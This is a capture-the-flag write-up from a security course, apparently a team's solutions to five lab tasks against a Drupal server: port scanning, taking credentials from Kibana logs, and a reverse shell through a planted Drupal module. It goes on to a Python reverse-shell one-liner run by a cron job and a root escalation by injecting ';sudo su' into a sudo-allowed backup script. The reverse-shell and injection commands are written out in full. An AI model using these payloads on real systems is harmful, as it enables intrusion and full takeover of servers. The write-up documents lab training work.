    
## Task 1- Portable

> Your target website is not running on the common port 80, can you find
> the correct one? Submit the flag you find on the site.

In order to scan all ports of the target system, `nmap` together with the target IP has to be utilized. This can be done using the following command: `nmap -Pn -T4 -A -p- 10.225.149.170`. `-Pn` meaning Dont Ping, enables nmap to perform its function regardless if the target is active or not. `-T4` sets the speed of the scan, which scans the ports quickly without omitting important information. `-A` means Agressive Scan, and enables nmap to scan important information like OS, version, script and traceroute. Finally `-p-` specifies that all the ports of the target system should be scanned.

Using the given commands, Nmap scans all the ports of the target system, and confirms that ports `22`, `1337` and `7331` are open. However, it also states that port `1337` is the `Wrong port :)`, and therefore we proceed to the next port. `7331` is the last open port, and it is returning data. This means that the webpage should be located in this last open port.

<img width="749" alt="164413183-b75a837e-0178-47c0-93b5-fd7dfcb6c662" src="https://user-images.githubusercontent.com/46780028/167447678-d76b9015-70f4-4ac6-b4c7-34410ca43583.png">


The target webpage is found when the target IP and the correct port number 7331 is entered into the browser (http://10.225.149.170:7331/). On this page, the flag is revealed:

![image](https://user-images.githubusercontent.com/46780028/167448426-1add0bfd-b57a-426d-912a-f53189655ab5.png)

>**`Flag: IKT449{check_all_the_ports}`**

## Task 2 -  Web access

> With the help of the forensic evidence in Kibana, can you get access
> to the Drupal admin console?
> 
> **DO NOT BRUTEFORCE**
> 
> Submit the flag located in your email address after getting in.

We had access to the correct Drupal console but not the correct credentials to enter the admin console. The forensics evidence from Kibana contained over 87,000 hits; thus, some filtering was necessary to narrow the search. First, we thought that a great place to start looking for credentials was in the `http POST request` messages. When a user logs in or tries to log in, an http POST request is sent, and a successful or unsuccessful response is received. Then, after adding the filter `http.request.method: POST` we were left with 19 hits. 

When looking through some of them, we noticed that several of them tried to access the `user/login` page and thought that this filter might give us a narrow search. As seen below, adding the filter `http.request.headers.referer: http://10.13.37.4/user/login` left us with just three hits. 

 ![image](https://user-images.githubusercontent.com/72946914/167696514-2b4ac726-2db8-4f0f-b37b-3dca1585a008.png)

The attacker tried three different passwords, and most likely, his last attempt was the successful one. By checking the `http.response` message in this record, we see that the user was redirected to `http://10.13.374/user/1?check_logged_in=1`, indicating that the attempt was successful. 
![image](https://user-images.githubusercontent.com/72946914/167710984-476f3164-8e7f-4858-a15c-86fac3a04cf3.png)

Our thought was confirmed when entering the username *god* and password *password1* caused a successful login. 
![image](https://user-images.githubusercontent.com/72946914/164683204-efd1c930-bdf7-4b6b-931f-da415ef65e74.png)

Navigating to the user's profile information, we located the flag. 

![image](https://user-images.githubusercontent.com/72946914/167711169-60189d5c-6df1-491f-8c19-5738fe0c1425.png)

>**`Flag: IKT449{admin_access=god}`**

## Task 3 - www-data

> Web access was not enough for the attackers!
> Are you also able to get in interactive access?
> Flag is in the first directory you land in. Submit the content of www-data.txt

We already knew that we had to use the reverse shell technique to get interactive access to www-data, which could also be seen in the logs from Kibana. By investigating the hits from the previous task, we also saw that the Drupal version running at this site was Drupal 9. 

With a quick Google search at "drupal 9 reverse shell" we found several websites explaining the way forward for carrying out this attack. Several Drupal versions are vulnerable to remote code execution due to insecure use of `unserialize()` [(source)](https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/). One of the sites we found [(link)](https://www.sevenlayers.com/index.php/257-drupal-8-to-reverse-shell) provided us with a well-explained step-by-step guide which we benefitted from. 

The guide describes how one can exploit the use of modules in Drupal by inserting code into a `.module` file. At Drupal's website, we downloaded a random module compatible with Drupal 9, in this case, called *token*. 

![image](https://user-images.githubusercontent.com/70077872/167573879-1302944a-d324-45a6-800e-147cb45be604.png)

After unzipping the module, we added the following code line, with our designated IP address and the desired port number, to the file called `codefilter.module` : 

    exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_address/portnumber 0>&1'");
![image](https://user-images.githubusercontent.com/70077872/167573750-8dca4946-dd94-4f2d-8923-ecbda7b62a48.png)

 At the same time, we started a port listener in a terminal window by executing the command `nc -nvlp port_number`. 


After uploading the module, enabling it and installing it, we got a shell to www-data. 

![image](https://user-images.githubusercontent.com/70077872/167573128-1848a4ee-8881-4bbb-96e2-9aabb47cfe50.png)

We found the flag in `www-data.txt`.

![image](https://user-images.githubusercontent.com/70077872/167573357-162e2f3f-67d6-414f-bfb7-b871ac042453.png)

>**`Flag: IKT449{who_would_have_thought_adding_modules_is_bad}`**



## 4 - User

> www-data ? What, the attackers didn't stop there! What in the world
> has the  _user_  done to get himself pwned as well? Submit the content  of user.txt Would recommend upgrading to a "good" shell to use nano or vim (guide in canvas)

After we have gained access to `www-data`, it is time to see if we can gain access to the first user. Firstly, going to `/home/user` reveals that there is a folder called "coding_project". This folder contains a README file, a shell script, and a Scripts folder. As the README file states, the user is tired of people asking him/her to run Python files, so the file states: "to avoid further work on my part you can run any file as me instead!". This is a potential vulnerability as files put in the folder `/scripts` are essentially run with the privileges of the user:

![image](https://user-images.githubusercontent.com/70077872/167387362-d4e82870-b257-4335-8acb-e25c97628496.png)


The `run_files.sh` is just a script that enters the script folder, runs the file(s) with python3, and removes it afterward. Here, we can put in a file that is run as the user to try to gain access to the user account:

![image](https://user-images.githubusercontent.com/70077872/167388008-555a28ea-6279-40cc-841b-08f8c5f108c5.png)

A common attack vector would be to execute a python file that runs a reverse shell back to our machine. Since the script is run with user privileges, the reverse shell will ensure the connection runs with the user; giving us access. To execute this, and to allow python to run bash commands, we use the `os.system()` function which allows us to execute any command. The following code is a one-liner that can exploit this vulnerability:

![image](https://user-images.githubusercontent.com/70077872/167413332-dadfb1b2-d2f8-4c73-a4a1-e59d99054a63.png)


`echo "import os;os.system(\"/bin/bash -c \'bash -i >& /dev/tcp/10.225.149.204/9995 0>&1\'\")" > exploit.py`

When the cronjob automatically runs the `run_files.sh` which runs the `exploit.py` file, we get a connection using `nc -nlvp 9995` for listening on any incoming connections:

![image](https://user-images.githubusercontent.com/70077872/167413710-d34f73d1-0c22-4cb5-b303-1a3cb982bb11.png)

We can then collect the flag:

![image](https://user-images.githubusercontent.com/70077872/167413907-7375442e-0738-4ab0-abaf-72f33731a871.png)

>**Flag:`IKT449{not_approved_by_IT}`**


## 5 - Root

> It is game over, the attacker got root access.
> Could you help us figure out how this happened by getting to root yourself?

Having gained user access on the machine it is smart to check if the user has any admin privileges. Executing the command `sudo -l` shows the user administrative privileges on the machine.

<img width="796" alt="image" src="https://user-images.githubusercontent.com/59768512/167270262-887ad0d2-eedc-48c9-a667-8a5d37d74742.png">

As it turns out the user account can run the command `sudo /usr/bin/python3 /home/user/safe_backup.py *`.  The `*` here essentially means that the command can end with anything. It also seems that the person adding the admin rights to the user account has been very specific on the path of the executable and the file probably to avoid having users run fabricated files and executables by manipulating pathing or altering files. Looking at the permissions of the `safe_backup.py` it is owned by the root account and can therefore not be removed or altered.

<img width="320" alt="image" src="https://user-images.githubusercontent.com/59768512/167715284-3230f41f-471d-4670-8c3b-89ac95e277c7.png">

To get some idea of what is possible, looking at the `safe_backup.py` file is probably a good place to start.

<img width="870" alt="image" src="https://user-images.githubusercontent.com/59768512/167270179-3574d9be-a110-491c-8208-d4e76893d452.png">

Looking at the code within the file it seems like it archives the whole `/home/user` folder and names it after the current datetime. It also seems like a user can provide some input on files or folders they do not want to have archived using the `--exclude` option. In this python file the user can specify these files/folders using the option `-e` and if it is present in the command the user input is put into the command using the variable `args.e`. Another thing to point out is that there seems to be sanitation on what the user enters, which means that there is a possibility for injection of something into the command.

Looking at the `os.system` method the user input seems to be passed before the main part of the tar command, this could be manipulated as in Linux it is possible to run more than one command in a single line. One way to do this that does not account for if the first command is successful is using the `;` sign to separate commands. Therefore within the `--exclude` part of the command, we can inject commands. One way to do this is by simply adding `sudo su` which switches the account to the root account. The whole command would then be:

`sudo /usr/bin/python3 /home/user/safe_backup.py -e ";sudo su; tar"`

Adding the `; tar` at the end also ensures that the second part of the command runs smoothly without errors. 

<img width="578" alt="image" src="https://user-images.githubusercontent.com/59768512/167680228-faee620b-631b-4767-bb49-582f91864c6a.png">

While an error message is present for the first part of the command the shell has successfully been upgraded to the root account. Looking in the root directory the file `root.txt` is found which contains the flag.

<img width="312" alt="image" src="https://user-images.githubusercontent.com/59768512/167680481-26fcd5f2-b437-4c09-8d92-02b9a56c9a68.png">

>**Flag:`IKT449{root_doing_things_often_goes_bad}`**
